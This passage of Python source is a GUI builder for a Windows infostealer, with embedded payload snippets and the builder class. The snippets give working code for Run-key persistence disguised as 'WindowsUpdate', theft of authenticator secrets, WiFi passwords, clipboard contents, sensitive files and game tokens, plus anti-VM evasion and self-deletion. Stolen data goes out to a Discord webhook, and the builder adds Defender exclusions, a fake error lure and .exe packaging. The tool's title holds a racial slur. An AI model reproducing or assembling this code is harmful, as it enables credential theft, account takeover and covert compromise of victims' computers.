            winreg.CloseKey(run_key)
            dlog("startup: HKCU Run key added")
        except Exception as e:
            dlog(f"startup: HKCU registry failed: {e}")
        try:
            run_key_lm = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(run_key_lm, "WindowsUpdate", 0, winreg.REG_SZ, dest_path)
            winreg.CloseKey(run_key_lm)
            dlog("startup: HKLM Run key added")
        except Exception as e:
            dlog(f"startup: HKLM registry failed: {e}")
        dlog("startup: completed")
        path = os.path.join(OUT, "startup_status.txt")
        with open(path, "w") as f:
            f.write(f"Persistence installed:\\nStartup Folder: {dest_path}\\nRegistry HKCU + HKLM Run keys set.\\n")
        record_result("Startup Status", path)
    except Exception as e:
        dlog(f"startup FAIL: {e}")
''',
    "authenticator": '''
def scrape_authenticators():
    try:
        dlog("authenticator: starting...")
        auth_data = []
        try:
            import winreg
            ga_key_paths = [
                r"SOFTWARE\\Google\\Google Authenticator",
                r"SOFTWARE\\Google\\Google Authenticator\\Accounts",
            ]
            for key_path in ga_key_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                    i = 0
                    while True:
                        try:
                            val_name, val_data, val_type = winreg.EnumValue(key, i)
                            auth_data.append(f"[GoogleAuth/Registry] {val_name}: {val_data}")
                            i += 1
                        except OSError:
                            break
                    winreg.CloseKey(key)
                except: pass
        except Exception as e:
            dlog(f"authenticator: GoogleAuth registry fail: {e}")
        winauth_paths = [
            os.path.join(os.environ.get("APPDATA",""), "WinAuth"),
            os.path.join(os.environ.get("LOCALAPPDATA",""), "WinAuth"),
            os.path.join(os.environ.get("USERPROFILE",""), "Documents", "WinAuth"),
        ]
        for wp in winauth_paths:
            if os.path.exists(wp):
                for root, _, files in os.walk(wp):
                    for f in files:
                        if f.endswith(".xml"):
                            try:
                                fpath = os.path.join(root, f)
                                with open(fpath, "r", encoding="utf-8", errors="ignore") as xf:
                                    content = xf.read()
                                    for match in re.findall(r'<secret[^>]*>([^<]+)</secret>', content, re.I):
                                        auth_data.append(f"[WinAuth] {f}: secret={match}")
                                    for match in re.findall(r'Secret="([^"]+)"', content):
                                        auth_data.append(f"[WinAuth] {f}: Secret={match}")
                                    for match in re.findall(r'([A-Z2-7]{16,})', content):
                                        auth_data.append(f"[WinAuth] {f}: possible_totp={match}")
                            except: pass
        authy_paths = [
            os.path.join(os.environ.get("APPDATA",""), "Authy Desktop"),
            os.path.join(os.environ.get("LOCALAPPDATA",""), "authy"),
        ]
        for ap in authy_paths:
            if os.path.exists(ap):
                try:
                    dest = os.path.join(OUT, "authy_data")
                    shutil.copytree(ap, dest, dirs_exist_ok=True)
                    auth_data.append(f"[Authy] Full data copied to authy_data/")
                    record_result("Authy Data", dest)
                except Exception as e:
                    dlog(f"authenticator: Authy copy fail: {e}")
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                ext_storage = os.path.join(ua, prof, "Local Extension Settings")
                if os.path.exists(ext_storage):
                    for ext_id in os.listdir(ext_storage):
                        ext_dir = os.path.join(ext_storage, ext_id)
                        for root, _, files in os.walk(ext_dir):
                            for f in files:
                                if f.endswith(".ldb") or f.endswith(".log"):
                                    try:
                                        fpath = os.path.join(root, f)
                                        with open(fpath, "r", errors="ignore") as lf:
                                            content = lf.read()
                                            for match in re.findall(r'(?:secret|totp|2fa)[^"]*["\\']([A-Z2-7]{16,})', content, re.I):
                                                auth_data.append(f"[BrowserExt/{bname}/{prof}/{ext_id}] TOTP: {match}")
                                    except: pass
        ms_auth_path = os.path.join(os.environ.get("LOCALAPPDATA",""),
            "Packages", "Microsoft.MicrosoftAuthenticator_*")
        import glob as glob_mod
        for p in glob_mod.glob(ms_auth_path):
            try:
                dest = os.path.join(OUT, "ms_authenticator")
                shutil.copytree(p, dest, dirs_exist_ok=True)
                auth_data.append(f"[MS Auth] Data copied to ms_authenticator/")
                record_result("MS Authenticator", dest)
            except: pass
        try:
            import win32cred
            creds = win32cred.CredEnumerate(None, 0)
            if creds:
                for cred in creds:
                    target = cred.get("TargetName","")
                    if any(kw in target.lower() for kw in ["2fa","totp","authenticator","authy","otp","token"]):
                        username = cred.get("UserName","")
                        cred_blob = cred.get("CredentialBlob","")
                        try:
                            decoded = cred_blob.decode("utf-16-le", errors="ignore").strip("\\x00")
                        except:
                            decoded = str(cred_blob)[:100]
                        auth_data.append(f"[WinVault/2FA] {target} | User: {username} | Data: {decoded[:80]}")
        except: pass
        path = os.path.join(OUT, "authenticator_secrets.txt")
        uniq_data = list(set(auth_data))
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(uniq_data) if uniq_data else "No authenticator data found.")
        record_result("Authenticator Data", path)
        if uniq_data:
            send_text_now("🔐 Auth Secrets", "\\n".join(uniq_data[:15]))
        dlog(f"authenticator: found {len(uniq_data)} entries")
    except Exception as e:
        dlog(f"authenticator FAIL: {e}")
''',
    "wifi": r'''
def scrape_wifi():
    try:
        dlog("wifi: starting...")
        profiles_data = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                        capture_output=True, text=True,
                                        creationflags=0x08000000).stdout
        profiles = re.findall(r":\s*(.+)$", profiles_data, re.MULTILINE)
        wifi_entries = []
        for profile in profiles:
            profile = profile.strip()
            if profile:
                pw_data = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],
                                         capture_output=True, text=True,
                                         creationflags=0x08000000).stdout
                pw_match = re.search(r"Key Content\s*:\s*(.+)", pw_data)
                password = pw_match.group(1).strip() if pw_match else "(open)"
                wifi_entries.append(f"{profile}: {password}")
        path = os.path.join(OUT, "wifi_passwords.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(wifi_entries) if wifi_entries else "No wifi profiles found.")
        record_result("Wifi Passwords", path)
        if wifi_entries:
            send_text_now("\U0001f4f6 WiFi Passwords", "\n".join(wifi_entries[:15]))
        dlog(f"wifi: {len(wifi_entries)} profiles extracted")
    except Exception as e:
        dlog(f"wifi FAIL: {e}")
''',
    "clipboard": '''
def scrape_clipboard():
    try:
        dlog("clipboard: starting...")
        result = subprocess.run(["powershell", "-Command", "Get-Clipboard"],
                               capture_output=True, text=True,
                               timeout=5, creationflags=0x08000000)
        content = result.stdout.strip()
        if content and len(content) > 0:
            path = os.path.join(OUT, "clipboard.txt")
            with open(path, "w", encoding="utf-8", errors="replace") as f:
                f.write(content)
            record_result("Clipboard", path)
            send_text_now("\\U0001f4cb Clipboard", content[:1900])
            dlog("clipboard: captured")
    except:
        pass
''',
    "common_files": '''
def scrape_common_files():
    try:
        dlog("common_files: starting...")
        search_dirs = [
            os.path.join(os.environ.get("USERPROFILE",""), "Desktop"),
            os.path.join(os.environ.get("USERPROFILE",""), "Documents"),
            os.path.join(os.environ.get("USERPROFILE",""), "Downloads"),
        ]
        sensitive_keywords = [
            "password", "secret", "wallet", "bitcoin", "ethereum", "private key",
            "recovery", "seed", "mnemonic", "backup", "credential", "login",
            "bank", "account", "2fa", "token", "api key", "confidential"
        ]
        sensitive_extensions = [
            ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
            ".kdbx", ".rdp", ".ovpn", ".key", ".pem", ".ppk",
            ".json", ".xml", ".cfg", ".ini", ".env", ".log"
        ]
        found_files = []
        dest_dir = os.path.join(OUT, "CommonFiles")
        os.makedirs(dest_dir, exist_ok=True)
        for search_dir in search_dirs:
            if not os.path.exists(search_dir): continue
            for root, _, files in os.walk(search_dir):
                for f in files:
                    fpath = os.path.join(root, f)
                    fname_lower = f.lower()
                    matched = False
                    for kw in sensitive_keywords:
                        if kw in fname_lower:
                            matched = True
                            break
                    if not matched:
                        for ext in sensitive_extensions:
                            if fname_lower.endswith(ext):
                                matched = True
                                break
                    if matched and not fname_lower.endswith(".lnk"):
                        try:
                            if os.path.getsize(fpath) < 10 * 1024 * 1024:
                                shutil.copy2(fpath, os.path.join(dest_dir, f))
                                found_files.append(f)
                        except: pass
        if found_files:
            zp = os.path.join(OUT, "common_files.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", dest_dir)
            record_result("Common Files", zp)
        dlog(f"common_files: {len(found_files)} files collected")
    except Exception as e:
        dlog(f"common_files FAIL: {e}")
''',
    "games": '''
def scrape_games():
    try:
        dlog("games: starting...")
        game_data = []

        # Minecraft
        mc_dir = os.path.join(os.environ.get("APPDATA",""), ".minecraft")
        if os.path.exists(mc_dir):
            launcher_acc = os.path.join(mc_dir, "launcher_accounts.json")
            if os.path.exists(launcher_acc):
                try:
                    with open(launcher_acc, "r", encoding="utf-8") as f:
                        game_data.append(f"[Minecraft/launcher_accounts.json]:\\n{f.read()[:3000]}")
                except: pass
            launcher_prof = os.path.join(mc_dir, "launcher_profiles.json")
            if os.path.exists(launcher_prof):
                try:
                    with open(launcher_prof, "r", encoding="utf-8") as f:
                        content = f.read()
                        game_data.append(f"[Minecraft/launcher_profiles.json]:\\n{content[:3000]}")
                        for match in re.findall(r'"accessToken"\\s*:\\s*"([^"]+)"', content):
                            game_data.append(f"[Minecraft/Token] accessToken: {match}")
                except: pass
            for launcher_name in ["MultiMC", "PrismLauncher"]:
                launcher_dir = os.path.join(os.environ.get("APPDATA",""), launcher_name)
                if os.path.exists(launcher_dir):
                    accounts_file = os.path.join(launcher_dir, "accounts.json")
                    if os.path.exists(accounts_file):
                        try:
                            with open(accounts_file, "r", encoding="utf-8") as f:
                                game_data.append(f"[{launcher_name}/accounts.json]:\\n{f.read()[:3000]}")
                        except: pass

        # Epic Games
        epic_dir = os.path.join(os.environ.get("LOCALAPPDATA",""),
            "EpicGamesLauncher", "Saved", "Config", "Windows")
        if os.path.exists(epic_dir):
            for fname in ["GameUserSettings.ini", "Engine.ini"]:
                fpath = os.path.join(epic_dir, fname)
                if os.path.exists(fpath):
                    try:
                        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            game_data.append(f"[EpicGames/{fname}]:\\n{content[:3000]}")
                    except: pass

        epic_saved = os.path.dirname(epic_dir) if os.path.exists(epic_dir) else ""
        if epic_saved and os.path.exists(epic_saved):
            try:
                dest = os.path.join(OUT, "EpicGames_Config")
                shutil.copytree(epic_saved, dest, dirs_exist_ok=True)
                record_result("Epic Games Config", dest)
            except: pass

        path = os.path.join(OUT, "games_data.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n\\n".join(game_data) if game_data else "No game sessions found.")
        record_result("Games Data", path)
        dlog(f"games: {len(game_data)} entries found")
    except Exception as e:
        dlog(f"games FAIL: {e}")
''',
    "anti_vm": '''
def check_anti_vm_debug():
    try:
        dlog("anti_vm: checking...")
        vm_indicators = []
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                vm_indicators.append("debugger_present")
        except: pass
        vm_registry_keys = [
            r"SOFTWARE\\VMware, Inc.\\VMware Tools",
            r"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            r"HARDWARE\\ACPI\\DSDT\\VBOX__",
            r"HARDWARE\\ACPI\\DSDT\\VMwareVirtualPC",
            r"SYSTEM\\ControlSet001\\Services\\vmbus",
            r"SYSTEM\\ControlSet001\\Services\\VBoxSF",
        ]
        import winreg
        for key_path in vm_registry_keys:
            try:
                hive = winreg.HKEY_LOCAL_MACHINE
                winreg.OpenKey(hive, key_path)
                last_part = key_path.split("\\\\")[-1]
                vm_indicators.append(f"reg:{last_part}")
                winreg.CloseKey(hive)
            except: pass
        vm_processes = [
            "vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
            "VBoxService.exe","VBoxTray.exe","xenservice.exe",
            "vmsrvc.exe","vmusrvc.exe","prl_tools.exe"
        ]
        try:
            result = subprocess.run(["tasklist"], capture_output=True, text=True,
                                    creationflags=0x08000000)
            for proc in vm_processes:
                if proc.lower() in result.stdout.lower():
                    vm_indicators.append(f"proc:{proc}")
        except: pass
        try:
            user32 = ctypes.windll.user32
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            if w <= 1024 and h <= 768:
                vm_indicators.append(f"small_screen:{w}x{h}")
        except: pass
        if vm_indicators:
            dlog(f"anti_vm: DETECTED -- {', '.join(vm_indicators)} -- exiting silently")
            sys.exit(0)
        else:
            dlog("anti_vm: clean -- proceeding")
    except Exception as e:
        dlog(f"anti_vm check FAIL (proceeding anyway): {e}")
''',
    "self_destruct": '''
def self_destruct():
    """Delete the payload executable after harvest via batch file trick."""
    try:
        dlog("self_destruct: starting...")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else None
        if not current_exe or not os.path.exists(current_exe):
            dlog("self_destruct: not a frozen exe, skipping")
            return
        bat_path = os.path.join(TEMP, "cleanup.bat")
        bat_content = "@echo off\\n:loop\\ndel /f \\"" + current_exe + "\\"\\nif exist \\"" + current_exe + "\\" (\\n    timeout /t 2 /nobreak >nul\\n    goto loop\\n)\\ndel /f \\"%~f0\\"\\n"
        with open(bat_path, "w") as f:
            f.write(bat_content)
        subprocess.Popen(["cmd", "/c", bat_path],
                        creationflags=0x08000000 | 0x00000008,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        dlog("self_destruct: cleanup.bat launched")
    except Exception as e:
        dlog(f"self_destruct FAIL: {e}")
''',
    "anti_spam": '''
def check_anti_spam_mutex():
    try:
        import ctypes
        import ctypes.wintypes
        mutex_name = MUTEX_NAME
        handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            dlog("anti_spam: another instance is running, exiting")
            sys.exit(0)
        dlog(f"anti_spam: mutex acquired ({mutex_name})")
    except Exception as e:
        dlog(f"anti_spam check FAIL (proceeding anyway): {e}")
''',
}
class MalwareBuilder:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title(BUILDER_TITLE)
        self.root.geometry("940x900")
        self.root.configure(fg_color=COLORS["bg"])
        self.root.resizable(False, False)
        self.root.bind("<Control-b>", lambda e: self.build_payload())

        self.webhook_var = ctk.StringVar()
        self.filename_var = ctk.StringVar(value="payload")
        self.format_var = ctk.StringVar(value=".exe")
        self.icon_path = None
        self.fake_error_title = ctk.StringVar(value="Error")
        self.fake_error_msg = ctk.StringVar(value="Application failed to start.")
        self.ping_var = ctk.StringVar(value="off")
        self.ping_type_var = ctk.StringVar(value="Here")
        self.console_text = None

        self.cb_vars = {}
        options = [
            "System Info", "Telegram Sessions", "Extensions", "Wallets",
            "Roblox Cookies", "Credit Cards", "Passwords", "Cookies",
            "Browser History", "Downloads", "Search History", "Discord Tokens",
            "Passkeys / WebAuthn", "Webcam", "Screenshot", "Keylogger",
            "Fake Error", "Disable Defender", "Add Exclusion", "Startup",
            "Authenticator", "WiFi Passwords", "Clipboard", "Common Files",
            "Games", "Anti-VM/Debug", "Self-Destruct", "Anti-Spam"
        ]
        for opt in options:
            self.cb_vars[opt] = ctk.StringVar(value="off")

        self.build_ui()

    def log(self, message, tag=""):
        if self.console_text:
            self.console_text.configure(state="normal")
            prefix = ""
            if tag == "success": prefix = "✅ "
            elif tag == "error": prefix = "❌ "
            elif tag == "info": prefix = "ℹ️ "
            elif tag == "warn": prefix = "⚠️ "
            self.console_text.insert("end", f"{prefix}{message}\n")
            self.console_text.see("end")
            self.console_text.configure(state="disabled")
            self.root.update_idletasks()

    def build_ui(self):
        # ── Header ──
        header = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=12, height=72)
        header.pack(fill="x", padx=16, pady=(16, 8))
        header.pack_propagate(False)
        ctk.CTkLabel(header, text="⚡ NIGGA FUCKER v7.4", font=("Segoe UI", 26, "bold"),
                     text_color=COLORS["accent"]).pack(side="left", padx=20, pady=15)
        ctk.CTkLabel(header, text="INE - BY NODE", font=("Segoe UI", 11),
                     text_color=COLORS["text_dim"]).pack(side="right", padx=20, pady=15)

        wh_frame = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        wh_frame.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkLabel(wh_frame, text="Webhook:", font=("Segoe UI", 13, "bold"),
                     text_color=COLORS["accent"]).pack(side="left", padx=(16, 8), pady=12)
        ctk.CTkEntry(wh_frame, textvariable=self.webhook_var, width=380,
                      fg_color=COLORS["entry_bg"], border_color=COLORS["accent"],
                      placeholder_text="https://discord.com/api/webhooks/...",
                      font=("Consolas", 11)).pack(side="left", padx=4, pady=10)
        ctk.CTkButton(wh_frame, text="🔍 Test", command=self.test_webhook_action,
                       fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                       width=90, corner_radius=6, font=("Segoe UI", 12, "bold")).pack(side="left", padx=8)
        ctk.CTkButton(wh_frame, text="📋 Paste", command=self.paste_webhook,
                       fg_color=COLORS["entry_bg"], hover_color="#2a2a35",
                       width=80, corner_radius=6, font=("Segoe UI", 11)).pack(side="left", padx=2)

        ping_frame = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        ping_frame.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkCheckBox(ping_frame, text="Ping on Send", variable=self.ping_var,
                         onvalue="on", offvalue="off",
                         fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                         border_color=COLORS["entry_bg"], text_color=COLORS["text"],
                         font=("Segoe UI", 12), corner_radius=4,
                         command=self.on_ping_toggle).pack(side="left", padx=(14, 8), pady=8)
        self.ping_type_menu = ctk.CTkOptionMenu(ping_frame, variable=self.ping_type_var,
                         values=["Everyone", "Here"],
                         fg_color=COLORS["accent"], button_color=COLORS["accent_hover"],
                         width=100, font=("Segoe UI", 11))
        self.ping_type_menu.pack(side="left", padx=2, pady=8)
        self.ping_type_menu.configure(state="disabled")

        cb_section = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        cb_section.pack(fill="both", expand=True, padx=16, pady=(0, 8))

        btn_row = ctk.CTkFrame(cb_section, fg_color="transparent")
        btn_row.pack(fill="x", padx=16, pady=(12, 4))
        ctk.CTkLabel(btn_row, text="🎯 Select Features:", font=("Segoe UI", 14, "bold"),
                     text_color=COLORS["accent_glow"]).pack(side="left")
        ctk.CTkButton(btn_row, text="All", command=self.select_all,
                       fg_color=COLORS["entry_bg"], hover_color=COLORS["accent_hover"],
                       width=55, corner_radius=4, font=("Segoe UI", 10)).pack(side="right", padx=4)
        ctk.CTkButton(btn_row, text="None", command=self.deselect_all,
                       fg_color=COLORS["entry_bg"], hover_color=COLORS["accent_hover"],
                       width=55, corner_radius=4, font=("Segoe UI", 10)).pack(side="right", padx=2)
        ctk.CTkButton(btn_row, text="Stealers", command=self.select_stealers,
                       fg_color=COLORS["entry_bg"], hover_color=COLORS["accent_hover"],
                       width=70, corner_radius=4, font=("Segoe UI", 10)).pack(side="right", padx=4)

        grid = ctk.CTkFrame(cb_section, fg_color="transparent")
        grid.pack(padx=12, pady=(4, 8))
        row, col = 0, 0
        for opt, var in self.cb_vars.items():
            cb = ctk.CTkCheckBox(grid, text=opt, variable=var, onvalue="on", offvalue="off",
                                  fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                                  border_color=COLORS["entry_bg"], text_color=COLORS["text"],
                                  font=("Segoe UI", 11), corner_radius=4)
            cb.grid(row=row, column=col, sticky="w", padx=8, pady=4)
            col += 1
            if col > 3:
                col = 0
                row += 1

        fake_frame = ctk.CTkFrame(cb_section, fg_color=COLORS["entry_bg"], corner_radius=8)
        fake_frame.pack(fill="x", padx=16, pady=(4, 12))
        ctk.CTkLabel(fake_frame, text="Fake Error:", font=("Segoe UI", 11, "bold"),
                     text_color=COLORS["accent"]).pack(side="left", padx=(12, 6), pady=8)
        ctk.CTkEntry(fake_frame, textvariable=self.fake_error_title, width=130,
                      fg_color=COLORS["frame_bg"], border_color=COLORS["accent"],
                      font=("Segoe UI", 11)).pack(side="left", padx=3, pady=6)
        ctk.CTkEntry(fake_frame, textvariable=self.fake_error_msg, width=280,
                      fg_color=COLORS["frame_bg"], border_color=COLORS["accent"],
                      font=("Segoe UI", 11)).pack(side="left", padx=3, pady=6)

        build_row = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        build_row.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkLabel(build_row, text="Format:", font=("Segoe UI", 12),
                     text_color=COLORS["text"]).pack(side="left", padx=(14, 4), pady=10)
        self.fmt_menu = ctk.CTkOptionMenu(build_row, variable=self.format_var, values=[".exe", ".py"],
                           fg_color=COLORS["accent"], button_color=COLORS["accent_hover"],
                           width=65, font=("Segoe UI", 11), command=self.on_format_change)
        self.fmt_menu.pack(side="left", padx=2, pady=10)
        ctk.CTkLabel(build_row, text="Name:", font=("Segoe UI", 12),
                     text_color=COLORS["text"]).pack(side="left", padx=(16, 4))
        ctk.CTkEntry(build_row, textvariable=self.filename_var, width=145,
                      fg_color=COLORS["entry_bg"], border_color=COLORS["accent"],
                      font=("Consolas", 11)).pack(side="left", padx=2, pady=10)
        self.icon_btn = ctk.CTkButton(build_row, text="🎨 Icon", command=self.choose_icon,
                                       fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                                       width=75, corner_radius=6, font=("Segoe UI", 11))
        self.icon_btn.pack(side="left", padx=(12, 4))
        self.icon_label = ctk.CTkLabel(build_row, text="No icon", font=("Segoe UI", 10),
                                        text_color=COLORS["text_dim"])
        self.icon_label.pack(side="left", padx=2)

        ctk.CTkButton(build_row, text="⚡ BUILD", command=self.build_payload,
                       fg_color=COLORS["success"], hover_color="#1e8449",
                       font=("Segoe UI", 15, "bold"), width=120, height=38,
                       corner_radius=8).pack(side="right", padx=18, pady=8)

        self.on_format_change(self.format_var.get())

        console_frame = ctk.CTkFrame(self.root, fg_color=COLORS["console_bg"], corner_radius=10)
        console_frame.pack(fill="both", expand=True, padx=16, pady=(0, 14))
        ctk.CTkLabel(console_frame, text="📟 Build Console", font=("Consolas", 11, "bold"),
                     text_color=COLORS["accent_glow"]).pack(anchor="w", padx=14, pady=(8, 2))
        self.console_text = tk.Text(console_frame, bg=COLORS["console_bg"], fg=COLORS["text"],
                                     insertbackground=COLORS["accent"], font=("Consolas", 10),
                                     relief="flat", borderwidth=0, padx=12, pady=8,
                                     state="disabled", wrap="word", height=8)
        self.console_text.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        scrollbar = ctk.CTkScrollbar(console_frame, command=self.console_text.yview)
        scrollbar.pack(side="right", fill="y", padx=(0, 8), pady=(0, 10))
        self.console_text.configure(yscrollcommand=scrollbar.set)

        self.log("v7.4 READY — 15 browsers, WiFi, Clipboard, Games, Anti-VM, Self-Destruct, Anti-Spam.", "info")
        self.log("Tip: Ctrl+B to build. Help: https://discord.gg/Kr4SjcPfTE", "info")

    def on_ping_toggle(self):
        if self.ping_var.get() == "on":
            self.ping_type_menu.configure(state="normal")
        else:
            self.ping_type_menu.configure(state="disabled")

    def select_all(self):
        for var in self.cb_vars.values(): var.set("on")
        self.log("All features selected.", "info")

    def deselect_all(self):
        for var in self.cb_vars.values(): var.set("off")
        self.log("All features deselected.", "info")

    def select_stealers(self):
        stealer_keys = ["System Info", "Telegram Sessions", "Extensions", "Wallets",
                        "Roblox Cookies", "Credit Cards", "Passwords", "Cookies",
                        "Browser History", "Downloads", "Search History", "Discord Tokens",
                        "Passkeys / WebAuthn", "Webcam", "Screenshot", "Keylogger",
                        "Authenticator", "WiFi Passwords", "Clipboard", "Common Files", "Games"]
        for k, v in self.cb_vars.items():
            v.set("on" if k in stealer_keys else "off")
        self.log("Stealer features selected (persistence/defense excluded).", "info")

    def paste_webhook(self):
        try:
            clip = self.root.clipboard_get()
            if clip.strip():
                self.webhook_var.set(clip.strip())
                self.log("Webhook pasted from clipboard.", "info")
        except:
            self.log("Could not paste from clipboard.", "warn")

    def on_format_change(self, choice):
        if choice == ".py":
            self.icon_btn.configure(state="disabled", fg_color=COLORS["entry_bg"])
            self.icon_label.configure(text="(icon for .exe only)")
        else:
            self.icon_btn.configure(state="normal", fg_color=COLORS["accent"])
            self.icon_label.configure(text=os.path.basename(self.icon_path) if self.icon_path else "No icon")

    def choose_icon(self):
        path = filedialog.askopenfilename(
            title="Choose Icon",
            filetypes=[("Icon files", "*.ico *.png *.jpg *.jpeg"), ("All files", "*.*")]
        )
        if path:
            self.icon_path = path
            self.icon_label.configure(text=os.path.basename(path))
            self.log(f"Icon selected: {os.path.basename(path)}", "info")

    def test_webhook_action(self):
        url = self.webhook_var.get().strip()
        if not url:
            self.log("No webhook URL entered.", "error")
            messagebox.showerror("Error", "Enter a webhook URL first.")
            return
        self.log(f"Testing webhook: {url[:60]}...", "info")
        ok, msg = test_webhook(url)
        if ok:
            self.log(msg, "success")
            messagebox.showinfo("Webhook Test", msg)
        else:
            self.log(msg, "error")
            messagebox.showerror("Webhook Test", msg)

    def build_payload(self):
        webhook = self.webhook_var.get().strip()
        if not webhook:
            self.log("ERROR: No webhook URL provided.", "error")
            messagebox.showerror("Error", "Enter a Discord webhook URL.")
            return
        name = self.filename_var.get().strip()
        if not name:
            self.log("ERROR: No filename provided.", "error")
            messagebox.showerror("Error", "Enter a filename.")
            return
        fmt = self.format_var.get()

        self.log("=" * 50, "")
        self.log(f"BUILD STARTED — {name}{fmt}", "info")
        self.log(f"Webhook: {webhook[:55]}...", "info")
        self.log("Adding output folders to Defender exclusions...", "info")
        add_self_exclusion()
        self.log("Output folders excluded from Defender.", "success")

        if fmt == ".exe":
            ok, info = check_pyinstaller()
            if not ok:
                self.log(f"PyInstaller not found: {info}", "error")
                messagebox.showerror("PyInstaller Missing",
                    f"Cannot build .exe:\n{info}\n\nInstall: pip install pyinstaller")
                return
            self.log(f"PyInstaller: {info}", "info")

        mapping = {
            "System Info": "system_info", "Telegram Sessions": "telegram",
            "Extensions": "extensions", "Wallets": "wallets",
            "Roblox Cookies": "roblox", "Credit Cards": "credit_cards",
            "Passwords": "passwords", "Cookies": "cookies",
            "Browser History": "history", "Downloads": "downloads",
            "Search History": "search", "Discord Tokens": "discord",
            "Passkeys / WebAuthn": "passkeys",
            "Webcam": "webcam", "Screenshot": "screenshot",
            "Keylogger": "keylogger_scraper", "Fake Error": "fake_error",
            "Disable Defender": "disable_defender", "Add Exclusion": "add_exclusion",
            "Startup": "startup", "Authenticator": "authenticator",
            "WiFi Passwords": "wifi", "Clipboard": "clipboard",
            "Common Files": "common_files", "Games": "games",
            "Anti-VM/Debug": "anti_vm", "Self-Destruct": "self_destruct",
            "Anti-Spam": "anti_spam"
        }

        replacements = {"webhook": webhook}
        selected_functions = []
        has_keylogger = False
        has_anti_vm = False
        has_self_destruct = False
        has_anti_spam = False
        enabled_count = 0

        import random as rand_mod, string as str_mod
        mutex_name = "".join(rand_mod.choices(str_mod.ascii_letters + str_mod.digits, k=16))
        replacements["mutex_name"] = mutex_name

        if self.ping_var.get() == "on":
            replacements["ping_type"] = self.ping_type_var.get()
            self.log(f"  ✓ Ping: @{self.ping_type_var.get()}", "success")
        else:
            replacements["ping_type"] = "None"

        for label, key in mapping.items():
            if self.cb_vars[label].get() == "on":
                enabled_count += 1
                snippet = SNIPPETS[key]
                if key == "fake_error":
                    safe_title = self.fake_error_title.get().replace('\\', '\\\\').replace('"', '\\"')
                    safe_msg = self.fake_error_msg.get().replace('\\', '\\\\').replace('"', '\\"')
                    snippet = snippet.replace("{title}", safe_title)
                    snippet = snippet.replace("{message}", safe_msg)
                if key == "keylogger_scraper":
                    has_keylogger = True
                if key == "anti_vm":
                    has_anti_vm = True
                if key == "self_destruct":
                    has_self_destruct = True
                if key == "anti_spam":
                    has_anti_spam = True
                replacements[key] = textwrap.indent(snippet, '    ')
                fn_name = snippet.strip().split("def ")[1].split("(")[0]
                if key == "keylogger_scraper":
                    selected_functions.append("save_keylogger_results")
                elif key == "anti_vm":
                    pass  # called directly, not via scraper list
                elif key == "self_destruct":
                    pass  # called directly at end
                elif key == "anti_spam":
                    pass  # called directly at start
                else:
                    selected_functions.append(fn_name)
                self.log(f"  ✓ {label}", "success")
            else:
                replacements[key] = "    pass"

        if enabled_count == 0:
            self.log("WARNING: No features selected.", "warn")

        if has_anti_vm:
            replacements["anti_vm_check"] = "check_anti_vm_debug()"
        else:
            replacements["anti_vm_check"] = "pass  # anti-vm disabled"

        if has_anti_spam:
            replacements["anti_spam_check"] = "check_anti_spam_mutex()"
        else:
            replacements["anti_spam_check"] = "pass  # anti-spam disabled"

        if has_self_destruct:
            replacements["self_destruct_call"] = "self_destruct()"
        else:
            replacements["self_destruct_call"] = "pass  # self-destruct disabled"

        scraper_list_lines = "\n".join(f"    scrapers.append({fn})" for fn in selected_functions)
        replacements["scraper_list"] = scraper_list_lines

        if has_keylogger:
            replacements["start_keylogger"] = "    keylogger_thread = Thread(target=keylogger_background, daemon=True); keylogger_thread.start()"
            replacements["stop_keylogger"] = "    KEYLOGGER_STOP.set()\n    if keylogger_thread: keylogger_thread.join(timeout=2)"
        else:
            replacements["start_keylogger"] = "    pass"
            replacements["stop_keylogger"] = "    pass"

        self.log("Generating payload code...", "info")
        payload_code = PAYLOAD_TEMPLATE.safe_substitute(replacements)

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        py_path = os.path.join(OUTPUT_DIR, f"{name}.py")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(payload_code)

        self.log("Validating payload syntax...", "info")
        ok, msg = validate_payload_code(py_path)
        if not ok:
            self.log(f"SYNTAX ERROR:", "error")
            self.log(f"  {msg}", "error")
            self.log(f"Payload .py kept for debugging: {py_path}", "warn")
            messagebox.showerror("Syntax Error",
